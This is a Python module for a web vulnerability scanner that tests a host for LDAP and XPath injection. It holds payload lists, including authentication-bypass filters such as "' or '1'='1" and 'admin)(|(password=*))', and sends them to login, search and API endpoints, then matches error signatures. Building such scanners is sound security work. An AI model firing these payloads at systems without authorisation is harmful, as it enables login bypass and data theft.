"""
LDAP and XPath Injection Scanner.
Tests for LDAP injection and XPath injection vulnerabilities.
"""

from __future__ import annotations

import re
from typing import TYPE_CHECKING, Any
from urllib.parse import urljoin, urlencode, quote

import httpx

from scanning.vuln_scanner import Finding, ScanModule
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)


class LDAPXPathScanner(ScanModule):
    """
    LDAP and XPath Injection Scanner.
    
    Tests for:
    - LDAP injection in authentication
    - LDAP injection in search
    - Blind LDAP injection
    - XPath injection in XML queries
    - Blind XPath injection
    - Authentication bypass via LDAP/XPath
    """
    
    name = "ldap_xpath_scanner"
    
    # LDAP injection payloads
    LDAP_PAYLOADS = [
        # Basic injection
        "*",
        "*)(&",
        "*)(|(&",
        "*()|&'",
        # Authentication bypass
        "admin)(&)",
        "admin)(|(password=*))",
        "*)(uid=*))(|(uid=*",
        # Blind LDAP
        "admin)(|(objectClass=*",
        "*)(objectClass=user",
        "*)(!(&(userPassword=*)",
        # Wildcard abuse
        "a*",
        "*a*",
        # Escape sequence
        "admin\\00",
        "admin%00",
        # Filter manipulation
        ")(cn=*",
        ")(|(cn=*)(sn=*",
        "*)(|(userPassword=a*)(",
        # DN injection
        "admin,dc=*",
        "admin)(objectClass=*",
    ]
    
    # XPath injection payloads
    XPATH_PAYLOADS = [
        # Basic XPath injection
        "' or '1'='1",
        "' or ''='",
        "1' or '1'='1",
        "x' or name()='username' or 'x'='y",
        # Authentication bypass
        "admin' or '1'='1",
        "admin'--",
        "admin']/*[1]/password[.='",
        # Blind XPath
        "' or 1=1 or '",
        "' or count(//user)>0 or '",
        "' or string-length(name(/*[1]))>1 or '",
        # Boolean extraction
        "' or substring(//user[1]/username,1,1)='a",
        "' or starts-with(//user[1]/username,'a') or '",
        # Node extraction
        "' | //user/* | '",
        "' or //* or '",
        # Numeric extraction
        "1 or 1=1",
        "1 and 1=1",
        # Comment injection
        "admin'/*",
        "admin'//",
    ]
    
    # LDAP error patterns
    LDAP_ERRORS = [
        "ldap_search",
        "ldap_bind",
        "invalid dn",
        "bad search filter",
        "invalid filter",
        "ldap error",
        "ldap_parse",
        "object class violation",
        "naming violation",
        "invalid syntax",
        "protocol error",
        "search filter is invalid",
        "javax.naming.directory",
        "com.sun.jndi.ldap",
    ]
    
    # XPath error patterns
    XPATH_ERRORS = [
        "xpath",
        "xmlxpathcomp",
        "xmlxpatheval",
        "invalid predicate",
        "expression error",
        "saxparseexception",
        "expression expected",
        "xpatherror",
        "xpathexception",
        "invalid expression",
        "javax.xml.xpath",
        "missing closing quote",
        "unbalanced predicate",
        "SimpleXMLElement",
        "DOMXPath",
    ]
    
    def __init__(self, settings: Settings) -> None:
        super().__init__(settings)
        self.timeout = settings.timeouts.request_timeout
    
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Scan for LDAP and XPath injection vulnerabilities."""
        findings: list[Finding] = []
        
        base_url = f"https://{host}" if not host.startswith("http") else host
        
        async with httpx.AsyncClient(verify=False, timeout=self.timeout) as client:
            # Get baseline response
            baseline = await self._get_baseline(client, base_url, rate_limiter)
            
            # Test LDAP injection in forms
            ldap_findings = await self._test_ldap_injection(
                client, base_url, baseline, rate_limiter
            )
            findings.extend(ldap_findings)
            
            # Test XPath injection
            xpath_findings = await self._test_xpath_injection(
                client, base_url, baseline, rate_limiter
            )
            findings.extend(xpath_findings)
            
            # Test authentication endpoints
            auth_findings = await self._test_auth_injection(
                client, base_url, rate_limiter
            )
            findings.extend(auth_findings)
            
            # Test search/query endpoints
            search_findings = await self._test_search_injection(
                client, base_url, baseline, rate_limiter
            )
            findings.extend(search_findings)
            
            # Test blind injection
            blind_findings = await self._test_blind_injection(
                client, base_url, rate_limiter
            )
            findings.extend(blind_findings)
        
        return findings
    
    async def _get_baseline(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> dict[str, Any]:
        """Get baseline response characteristics."""
        await rate_limiter.acquire()
        
        try:
            response = await client.get(base_url)
            return {
                "status": response.status_code,
                "length": len(response.text),
                "text": response.text[:1000],
            }
        except Exception:
            return {"status": 0, "length": 0, "text": ""}
    
    async def _test_ldap_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        baseline: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for LDAP injection vulnerabilities."""
        findings = []
        
        # Common LDAP endpoints
        ldap_endpoints = [
            "/login",
            "/auth",
            "/ldap",
            "/search",
            "/directory",
            "/users/search",
            "/api/users",
            "/api/ldap",
            "/api/auth",
        ]
        
        test_params = ["username", "user", "uid", "cn", "dn", "filter", "search", "query"]
        
        for endpoint in ldap_endpoints:
            url = urljoin(base_url, endpoint)
            
            for param in test_params:
                for payload in self.LDAP_PAYLOADS[:10]:  # Test first 10
                    await rate_limiter.acquire()
                    
                    try:
                        # Test GET
                        params = {param: payload, "password": "test"}
                        response = await client.get(url, params=params)
                        
                        if self._check_ldap_error(response.text):
                            findings.append(Finding(
                                name="LDAP Injection",
                                severity="HIGH",
                                confidence="HIGH",
                                description=f"LDAP injection in parameter '{param}'",
                                matched_at=url,
                                evidence=[
                                    f"Payload: {payload}",
                                    "LDAP error in response",
                                ],
                                cwe="CWE-90",
                                cvss_score=8.1,
                                remediation="Use LDAP parameter binding. "
                                           "Sanitize special characters (*)(|\\).",
                            ))
                            break
                        
                        # Check for authentication bypass
                        if response.status_code == 200:
                            if self._check_auth_bypass(response.text, baseline["text"]):
                                findings.append(Finding(
                                    name="LDAP Authentication Bypass",
                                    severity="CRITICAL",
                                    confidence="MEDIUM",
                                    description="Authentication bypass via LDAP injection",
                                    matched_at=url,
                                    evidence=[
                                        f"Payload: {payload}",
                                        "Authentication success indicators",
                                    ],
                                    cwe="CWE-90",
                                    cvss_score=9.8,
                                    remediation="Implement proper LDAP query parameterization.",
                                ))
                                break
                        
                        # Test POST
                        await rate_limiter.acquire()
                        response = await client.post(url, data=params)
                        
                        if self._check_ldap_error(response.text):
                            findings.append(Finding(
                                name="LDAP Injection (POST)",
                                severity="HIGH",
                                confidence="HIGH",
                                description=f"LDAP injection via POST parameter '{param}'",
                                matched_at=url,
                                evidence=[f"Payload: {payload}"],
                                cwe="CWE-90",
                                cvss_score=8.1,
                                remediation="Sanitize LDAP special characters.",
                            ))
                            break
                            
                    except Exception as e:
                        logger.debug(f"Error testing LDAP: {e}")
        
        return findings
    
    async def _test_xpath_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        baseline: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for XPath injection vulnerabilities."""
        findings = []
        
        # Common XPath endpoints
        xpath_endpoints = [
            "/login",
            "/search",
            "/api/search",
            "/xml",
            "/api/xml",
            "/query",
            "/filter",
            "/data",
            "/api/data",
        ]
        
        test_params = ["username", "user", "query", "search", "filter", "xpath", "id", "name"]
        
        for endpoint in xpath_endpoints:
            url = urljoin(base_url, endpoint)
            
            for param in test_params:
                for payload in self.XPATH_PAYLOADS[:10]:
                    await rate_limiter.acquire()
                    
                    try:
                        # Test GET
                        params = {param: payload}
                        response = await client.get(url, params=params)
                        
                        if self._check_xpath_error(response.text):
                            findings.append(Finding(
                                name="XPath Injection",
                                severity="HIGH",
                                confidence="HIGH",
                                description=f"XPath injection in parameter '{param}'",
                                matched_at=url,
                                evidence=[
                                    f"Payload: {payload}",
                                    "XPath error in response",
                                ],
                                cwe="CWE-643",
                                cvss_score=7.5,
                                remediation="Use parameterized XPath queries. "
                                           "Sanitize single quotes and special characters.",
                            ))
                            break
                        
                        # Check for data extraction
                        if response.status_code == 200 and len(response.text) > baseline["length"] * 1.5:
                            findings.append(Finding(
                                name="XPath Injection - Data Extraction",
                                severity="HIGH",
                                confidence="MEDIUM",
                                description="XPath injection may allow data extraction",
                                matched_at=url,
                                evidence=[
                                    f"Payload: {payload}",
                                    "Significantly larger response",
                                ],
                                cwe="CWE-643",
                                cvss_score=7.5,
                                remediation="Implement XPath query parameterization.",
                            ))
                            break
                        
                        # Test POST
                        await rate_limiter.acquire()
                        response = await client.post(url, data=params)
                        
                        if self._check_xpath_error(response.text):
                            findings.append(Finding(
                                name="XPath Injection (POST)",
                                severity="HIGH",
                                confidence="HIGH",
                                description=f"XPath injection via POST parameter '{param}'",
                                matched_at=url,
                                evidence=[f"Payload: {payload}"],
                                cwe="CWE-643",
                                cvss_score=7.5,
                                remediation="Use parameterized XPath queries.",
                            ))
                            break
                            
                    except Exception as e:
                        logger.debug(f"Error testing XPath: {e}")
        
        return findings
    
    async def _test_auth_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test authentication endpoints for LDAP/XPath injection."""
        findings = []
        
        auth_endpoints = [
            "/login",
            "/authenticate",
            "/auth/login",
            "/api/login",
            "/api/auth",
        ]
        
        # LDAP auth bypass payloads
        ldap_auth_bypass = [
            {"username": "*", "password": "*"},
            {"username": "admin)(|(password=*", "password": "x"},
            {"username": "*)(&", "password": "x"},
            {"username": "*)(uid=*))(|(uid=*", "password": "x"},
            {"username": "admin)(!(&(userPassword=*", "password": "x"},
        ]
        
        # XPath auth bypass payloads
        xpath_auth_bypass = [
            {"username": "' or '1'='1", "password": "' or '1'='1"},
            {"username": "admin' or '1'='1", "password": "x"},
            {"username": "admin'--", "password": "x"},
            {"username": "' or ''='", "password": "' or ''='"},
        ]
        
        for endpoint in auth_endpoints:
            url = urljoin(base_url, endpoint)
            
            # Check if endpoint exists
            await rate_limiter.acquire()
            try:
                check = await client.get(url)
                if check.status_code == 404:
                    continue
            except Exception:
                continue
            
            # Test LDAP bypass
            for payload in ldap_auth_bypass:
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(url, data=payload)
                    
                    if response.status_code in [200, 302]:
                        # Check for success indicators
                        success_indicators = ["dashboard", "welcome", "logout", "session", "token", "authenticated"]
                        
                        if any(ind in response.text.lower() for ind in success_indicators):
                            findings.append(Finding(
                                name="LDAP Authentication Bypass",
                                severity="CRITICAL",
                                confidence="HIGH",
                                description="Authentication bypass via LDAP injection",
                                matched_at=url,
                                evidence=[
                                    f"Payload: {payload}",
                                    "Authentication success",
                                ],
                                cwe="CWE-90",
                                cvss_score=9.8,
                                remediation="Never construct LDAP filters from user input. "
                                           "Use prepared statements.",
                            ))
                            break
                        
                except Exception as e:
                    logger.debug(f"Error testing LDAP auth: {e}")
            
            # Test XPath bypass
            for payload in xpath_auth_bypass:
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(url, data=payload)
                    
                    if response.status_code in [200, 302]:
                        success_indicators = ["dashboard", "welcome", "logout", "session", "token", "authenticated"]
                        
                        if any(ind in response.text.lower() for ind in success_indicators):
                            findings.append(Finding(
                                name="XPath Authentication Bypass",
                                severity="CRITICAL",
                                confidence="HIGH",
                                description="Authentication bypass via XPath injection",
                                matched_at=url,
                                evidence=[
                                    f"Payload: {payload}",
                                    "Authentication success",
                                ],
                                cwe="CWE-643",
                                cvss_score=9.8,
                                remediation="Use parameterized XPath queries.",
                            ))
                            break
                        
                except Exception as e:
                    logger.debug(f"Error testing XPath auth: {e}")
        
        return findings
    
    async def _test_search_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        baseline: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test search endpoints for injection."""
        findings = []
        
        search_endpoints = [
            "/search",
            "/api/search",
            "/users/search",
            "/directory/search",
            "/find",
            "/lookup",
        ]
        
        for endpoint in search_endpoints:
            url = urljoin(base_url, endpoint)
            
            # Test LDAP wildcard
            await rate_limiter.acquire()
            
            try:
                response = await client.get(url, params={"q": "*"})
                
                if response.status_code == 200 and len(response.text) > baseline["length"] * 2:
                    findings.append(Finding(
                        name="LDAP Wildcard Search",
                        severity="MEDIUM",
                        confidence="MEDIUM",
                        description="Search endpoint accepts LDAP wildcard, may enumerate data",
                        matched_at=url,
                        evidence=[
                            "Wildcard '*' returned large response",
                        ],
                        cwe="CWE-90",
                        cvss_score=5.3,
                        remediation="Sanitize wildcard characters. Implement result limits.",
                    ))
                    
            except Exception as e:
                logger.debug(f"Error testing search: {e}")
        
        return findings
    
    async def _test_blind_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for blind LDAP/XPath injection."""
        findings = []
        
        endpoints = ["/login", "/search", "/api/users"]
        
        for endpoint in endpoints:
            url = urljoin(base_url, endpoint)
            
            # Boolean-based blind LDAP
            await rate_limiter.acquire()
            
            try:
                # True condition
                true_response = await client.post(
                    url,
                    data={"username": "admin)(|(objectClass=*", "password": "test"}
                )
                
                await rate_limiter.acquire()
                
                # False condition
                false_response = await client.post(
                    url,
                    data={"username": "admin)(|(objectClass=nonexistent", "password": "test"}
                )
                
                # Compare responses
                if true_response.status_code == false_response.status_code == 200:
                    if len(true_response.text) != len(false_response.text):
                        findings.append(Finding(
                            name="Blind LDAP Injection",
                            severity="HIGH",
                            confidence="MEDIUM",
                            description="Boolean-based blind LDAP injection detected",
                            matched_at=url,
                            evidence=[
                                f"True response: {len(true_response.text)} bytes",
                                f"False response: {len(false_response.text)} bytes",
                            ],
                            cwe="CWE-90",
                            cvss_score=7.5,
                            remediation="Sanitize LDAP filter input.",
                        ))
                        
            except Exception as e:
                logger.debug(f"Error testing blind injection: {e}")
        
        return findings
    
    def _check_ldap_error(self, text: str) -> bool:
        """Check if response contains LDAP errors."""
        text_lower = text.lower()
        return any(error in text_lower for error in self.LDAP_ERRORS)
    
    def _check_xpath_error(self, text: str) -> bool:
        """Check if response contains XPath errors."""
        text_lower = text.lower()
        return any(error in text_lower for error in self.XPATH_ERRORS)
    
    def _check_auth_bypass(self, response_text: str, baseline_text: str) -> bool:
        """Check for authentication bypass indicators."""
        success_indicators = ["dashboard", "welcome", "logout", "profile", "session", "authenticated"]
        return any(ind in response_text.lower() and ind not in baseline_text.lower() for ind in success_indicators)
